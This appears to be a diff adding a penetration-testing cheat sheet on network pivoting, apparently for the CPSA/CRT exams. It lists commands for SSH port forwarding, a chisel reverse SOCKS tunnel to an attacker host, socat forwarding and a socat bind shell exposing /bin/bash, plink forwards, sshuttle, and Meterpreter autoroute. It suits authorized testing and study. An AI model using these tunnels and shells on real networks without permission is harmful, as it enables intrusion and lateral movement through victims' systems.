@@ -1,0 +1,66 @@
+🔄 Pivoting Cheat Sheet (CPSA/CRT)
+1. Recon First
+
+# On compromised host
+ipconfig /all        # Windows – check routes/subnets
+route print          # Windows – routing table
+ifconfig / ip addr   # Linux – interfaces and IPs
+ip route             # Linux – routing table
+
+
+2. SSH Port Forwarding
+Local Forward (attacker → target via pivot)
+
+ssh -L 8080:10.0.0.5:80 user@pivot
+# Access http://127.0.0.1:8080 on attacker
+Remote Forward (pivot → attacker)
+
+ssh -R 8080:127.0.0.1:80 user@pivot
+Dynamic Forward (SOCKS proxy)
+
+ssh -D 1080 user@pivot
+# Then edit /etc/proxychains.conf
+socks5  127.0.0.1 1080
+proxychains nmap -sT -Pn 10.0.0.0/24
+
+3. Chisel (fast & exam-friendly)
+Upload chisel binary to pivot
+	• Attacker (server):
+
+chisel server -p 8000 --reverse
+	• Pivot (client):
+
+chisel client attacker_ip:8000 R:1080:socks
+	• Use proxychains on attacker:
+
+proxychains nmap -sT -Pn 10.0.0.0/24
+
+4. Socat (Swiss army knife)
+Forward remote RDP to attacker
+
+# On pivot
+socat TCP-LISTEN:3389,fork TCP:10.0.0.5:3389
+Bind shell back to attacker
+
+socat TCP-LISTEN:4444,fork EXEC:/bin/bash
+
+5. Plink (Windows pivot helper)
+Remote port forward
+
+plink.exe -R 445:127.0.0.1:445 attacker@ip -pw password
+Dynamic SOCKS proxy
+
+plink.exe -D 1080 attacker@ip -pw password
+
+6. SSHuttle (VPN-style routing)
+
+sshuttle -r user@pivot 10.0.0.0/24
+# Routes whole subnet via SSH, no proxychains needed
+
+7. Meterpreter (Metasploit)
+
+meterpreter > run autoroute -s 10.0.0.0/24
+meterpreter > use auxiliary/server/socks_proxy
+Then:
+
+proxychains smbclient -L //10.0.0.5/
